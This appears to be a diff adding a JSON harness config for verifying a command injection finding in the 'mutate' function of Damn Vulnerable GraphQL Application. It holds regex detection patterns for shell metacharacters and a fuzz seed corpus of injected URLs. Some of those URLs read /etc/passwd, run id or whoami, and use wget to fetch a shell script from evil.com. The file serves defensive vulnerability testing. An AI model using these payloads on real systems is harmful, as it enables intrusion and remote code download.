@@ -1,0 +1,67 @@
+{
+  "monitor": {
+    "strategy": "recorded_call",
+    "patch_target": "helpers.run_cmd",
+    "target_arg_index": 0,
+    "target_arg_name": null,
+    "capture_what": "The full shell command string passed to helpers.run_cmd, containing the curl command with the user-controlled URL",
+    "additional_imports": []
+  },
+  "oracle_check": {
+    "condition_description": "The captured command string contains shell metacharacters (semicolons, pipes, logical AND, command substitution via $() or backticks) embedded after the URL portion, indicating a command injection payload broke through strip_dangerous_characters.",
+    "trigger_patterns": [
+      ";\\s*[a-zA-Z/]",
+      "\\|\\s*[a-zA-Z/]",
+      "&&\\s*[a-zA-Z/]",
+      "\\$\\(",
+      "`[^`]+`"
+    ],
+    "raise_type": "RuntimeError",
+    "raise_message_template": "PY_SHELL_COMMAND_CONSTRUCTED_FROM_INPUT: command injection detected in helpers.run_cmd argument — captured={captured} pattern={matched_pattern}"
+  },
+  "fuzz_guidance": {
+    "seed_corpus": [
+      "http://localhost; id:80/",
+      "http://localhost:80/; cat /etc/passwd",
+      "http://localhost|whoami:80/",
+      "http://localhost:80/$(id)",
+      "http://localhost`id`:80/",
+      "http://localhost:80/ && wget http://evil.com/shell.sh"
+    ],
+    "skip_condition": "False"
+  },
+  "_meta": {
+    "function": "mutate",
+    "file": "core/views.py",
+    "input_strategy": "direct_params",
+    "function_signature": "def mutate(info, host, port, path, scheme)",
+    "tainted_params": [
+      {
+        "name": "host",
+        "index": 1,
+        "type": "str"
+      },
+      {
+        "name": "port",
+        "index": 2,
+        "type": "str"
+      },
+      {
+        "name": "path",
+        "index": 3,
+        "type": "str"
+      },
+      {
+        "name": "scheme",
+        "index": 4,
+        "type": "str"
+      }
+    ],
+    "target_id": "py_shell_command_constructed_from_input_core_views_py_211",
+    "finding_id": "0",
+    "rule_id": "py/shell-command-constructed-from-input",
+    "rule_slug": "py_shell-command-constructed-from-input",
+    "model": "openai/glm-5-turbo",
+    "source_finding_artifact": "output/python/realvuln-damn-vulnerable-graphql-application/verification_results/findings/finding_0_py_shell-command-constructed-from-input.json"
+  }
+}
